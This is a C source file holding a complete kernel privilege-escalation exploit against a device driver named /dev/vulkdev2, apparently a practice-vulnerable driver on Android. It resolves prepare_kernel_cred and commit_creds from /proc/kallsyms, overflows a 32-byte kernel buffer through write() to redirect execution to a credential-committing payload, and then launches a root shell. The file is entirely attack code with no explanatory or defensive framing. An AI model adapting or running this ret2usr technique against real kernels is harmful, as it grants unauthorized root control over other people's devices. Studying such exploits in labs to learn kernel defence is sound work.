#include <stdlib.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>

#define VULKDEV_DEVICE "/dev/vulkdev2"
#define BUFF_SIZE 32

typedef unsigned long (* _prepare_kernel_cred)(unsigned long cred);
typedef int (* _commit_creds)(unsigned long cred);
_prepare_kernel_cred prepare_kernel_cred;
_commit_creds commit_creds;

int shellcode(void)
{
	return commit_creds(prepare_kernel_cred(0));
}

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int main(int argc, char* argv[])
{
	int fd;
	char buf[64];
	void **pc;

	prepare_kernel_cred = (_prepare_kernel_cred) get_symbol("prepare_kernel_cred");
	commit_creds = (_commit_creds) get_symbol("commit_creds");
	if (!prepare_kernel_cred || !commit_creds) {
		printf("get_symbol faild!\n");
		exit(1);
	}

	fd = open(VULKDEV_DEVICE, O_RDWR|O_NONBLOCK);
	if (fd == -1) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	pc = (void *)&buf[BUFF_SIZE + 4];
	*pc = (void *)shellcode;

	printf("getuid() = %d\n", getuid());
	write(fd, buf, 40);
	close(fd);

	printf("getuid() = %d\n", getuid());
	if (!getuid()) {
		printf("exec root shell\n");
		execl("/system/bin/sh", "sh", NULL);
	}
	return 0;
}

